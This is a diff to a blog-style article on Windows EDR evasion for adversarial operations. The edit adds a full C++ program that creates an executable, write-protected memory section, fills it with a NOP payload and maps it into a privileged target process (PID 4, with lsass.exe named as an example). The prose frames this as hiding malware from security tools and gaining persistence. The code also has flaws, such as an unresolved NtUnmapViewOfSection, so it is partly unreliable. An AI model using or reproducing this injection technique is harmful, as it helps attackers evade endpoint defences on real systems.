@@ -12,7 +12,7 @@ tags: [Windows API, EDR Evasion, Stealth, Persistence, Kernel Manipulation]
 
 In advanced adversarial operations, bypassing EDRs and security monitoring requires control over system internals that goes well beyond typical API hooking or patching. This article explores advanced techniques using deeply embedded, undocumented Windows functions and layered strategies that allow malware to stay hidden, avoid detection, and gain resilient persistence.
 
-## 1. Deep Kernel-Level Subversion: Manipulating Kernel Objects with `NtCreateSection`
+## 1. Creating and Mapping a Stealthy Memory Section `NtCreateSection`
 
 `NtCreateSection` is a powerful kernel-level function that creates a memory-mapped section that multiple processes can share. This is particularly useful for stealthy persistence, as sections can be used to hide code in non-pageable memory regions or even within critical system structures, making them nearly invisible to user-mode detection.
 
@@ -21,25 +21,161 @@ In advanced adversarial operations, bypassing EDRs and security monitoring requi
 
 ### Advanced Use Cases for `NtCreateSection`:
 
-- **Code Injection via Kernel Memory Sections**: By injecting code into a section and sharing it with other critical system processes, malware can establish a foothold that’s incredibly hard to detect. For example, you can create a section that maps memory into the System process (`PID 4`), essentially hiding code in an area few EDRs will inspect.
+- **Code Injection via Shared Memory Sections**: By injecting code into a shared memory section and mapping it into critical system-owned user-mode processes, such as `lsass.exe` or the System process (`PID 4`), malicious actors can establish a foothold that’s difficult to detect. This technique does not modify kernel memory directly but hides code in high-privilege, less frequently monitored memory spaces that many EDR solutions overlook.
 
-- **Anti-Forensics with Immutable Sections**: Immutable sections created with `SEC_IMAGE` and `SEC_NO_CHANGE` can prevent other processes, including security tools, from modifying or unloading sections. This can lock down injected code and ensure persistence without interference.
+- **Anti-Forensics with Immutable Sections**: Immutable sections created with `SEC_IMAGE` and `SEC_NO_CHANGE` can prevent other processes, including security tools, from modifying or unloading them. This creates a degree of immutability around injected code, ensuring persistence by locking down the section from interference and safeguarding it from typical user-mode memory scans.
 
 ### Code Example: Creating and Mapping a Stealthy Memory Section
 
 ```cpp
-HANDLE hSection;
-LARGE_INTEGER maxSize;
-maxSize.QuadPart = 0x1000; // 4 KB section for hidden payload
+#include <Windows.h>
+#include <winternl.h>
+#include <stdio.h>
 
-NtCreateSection(&hSection, SECTION_MAP_EXECUTE | SECTION_MAP_WRITE, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_NO_CHANGE, NULL);
+#pragma comment(lib, "ntdll.lib")
 
-PVOID baseAddress = NULL;
-SIZE_T viewSize = 0;
-NtMapViewOfSection(hSection, GetCurrentProcess(), &baseAddress, 0, 0, NULL, &viewSize, ViewUnmap, 0, PAGE_EXECUTE_READWRITE);
+#ifndef SEC_NO_CHANGE
+#define SEC_NO_CHANGE 0x00400000
+#endif
+#ifndef ViewUnmap
+#define ViewUnmap 2
+#endif
+
+typedef NTSTATUS(WINAPI* NtCreateSection_t)(
+    PHANDLE SectionHandle,
+    ACCESS_MASK DesiredAccess,
+    POBJECT_ATTRIBUTES ObjectAttributes,
+    PLARGE_INTEGER MaximumSize,
+    ULONG SectionPageProtection,
+    ULONG AllocationAttributes,
+    HANDLE FileHandle
+    );
+
+typedef NTSTATUS(WINAPI* NtMapViewOfSection_t)(
+    HANDLE SectionHandle,
+    HANDLE ProcessHandle,
+    PVOID* BaseAddress,
+    ULONG_PTR ZeroBits,
+    SIZE_T CommitSize,
+    PLARGE_INTEGER SectionOffset,
+    PSIZE_T ViewSize,
+    DWORD InheritDisposition,
+    ULONG AllocationType,
+    ULONG Win32Protect
+    );
+
+int main() {
+    HANDLE hSection = NULL;
+    LARGE_INTEGER maxSize;
+    maxSize.QuadPart = 0x1000; 
+
+    
+    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
+    if (!hNtdll) {
+        printf("Failed to load ntdll.dll\n");
+        return 1;
+    }
+
+    NtCreateSection_t NtCreateSection = (NtCreateSection_t)GetProcAddress(hNtdll, "NtCreateSection");
+    NtMapViewOfSection_t NtMapViewOfSection = (NtMapViewOfSection_t)GetProcAddress(hNtdll, "NtMapViewOfSection");
+
+    if (!NtCreateSection || !NtMapViewOfSection) {
+        printf("Failed to resolve NtCreateSection or NtMapViewOfSection\n");
+        FreeLibrary(hNtdll);
+        return 1;
+    }
+
+    // Create a shared memory section with execute and write permissions
+    NTSTATUS status = NtCreateSection(
+        &hSection,
+        SECTION_MAP_EXECUTE | SECTION_MAP_WRITE,
+        NULL,
+        &maxSize,
+        PAGE_EXECUTE_READWRITE,
+        SEC_COMMIT | SEC_NO_CHANGE,
+        NULL
+    );
+
+    if (status != 0) {
+        printf("NtCreateSection failed with status: 0x%X\n", status);
+        FreeLibrary(hNtdll);
+        return 1;
+    }
+
+    // Map the section into the current process's address space
+    PVOID baseAddress = NULL;
+    SIZE_T viewSize = 0;
+    status = NtMapViewOfSection(
+        hSection,
+        GetCurrentProcess(),
+        &baseAddress,
+        0,
+        0,
+        NULL,
+        &viewSize,
+        ViewUnmap,
+        0,
+        PAGE_EXECUTE_READWRITE
+    );
+
+    if (status != 0) {
+        printf("NtMapViewOfSection (self) failed with status: 0x%X\n", status);
+        CloseHandle(hSection);
+        FreeLibrary(hNtdll);
+        return 1;
+    }
+
+    // Write a simple payload or message into the shared section
+    memset(baseAddress, 0x90, viewSize);
+
+    // Now map this section into the target process (e.g., lsass.exe)
+    DWORD targetPid = 4;
+    HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
+    if (!hTargetProcess) {
+        printf("Failed to open target process\n");
+        NtUnmapViewOfSection(GetCurrentProcess(), baseAddress);
+        CloseHandle(hSection);
+        FreeLibrary(hNtdll);
+        return 1;
+    }
+
+    PVOID remoteBaseAddress = NULL;
+    status = NtMapViewOfSection(
+        hSection,
+        hTargetProcess,
+        &remoteBaseAddress,
+        0,
+        0,
+        NULL,
+        &viewSize,
+        ViewUnmap,
+        0,
+        PAGE_EXECUTE_READWRITE
+    );
+
+    if (status != 0) {
+        printf("NtMapViewOfSection (remote) failed with status: 0x%X\n", status);
+        CloseHandle(hTargetProcess);
+        NtUnmapViewOfSection(GetCurrentProcess(), baseAddress);
+        CloseHandle(hSection);
+        FreeLibrary(hNtdll);
+        return 1;
+    }
+
+    printf("Section mapped into target process at address: %p\n", remoteBaseAddress);
+
+    // Cleanup
+    NtUnmapViewOfSection(GetCurrentProcess(), baseAddress);
+    NtUnmapViewOfSection(hTargetProcess, remoteBaseAddress);
+    CloseHandle(hTargetProcess);
+    CloseHandle(hSection);
+    FreeLibrary(hNtdll);
+
+    return 0;
+}
 ```
 
-By mapping a section this way, malware can hide payloads in kernel memory regions where most EDRs won’t look, establishing deep persistence.
+By mapping a section this way, malware can hide payloads in system memory regions where most EDRs won’t look, establishing deep persistence.
 
 ## 2. Advanced ETW and Telemetry Manipulation: Subverting Internal ETW Stacks with `EtwSetProviderTraits`
 
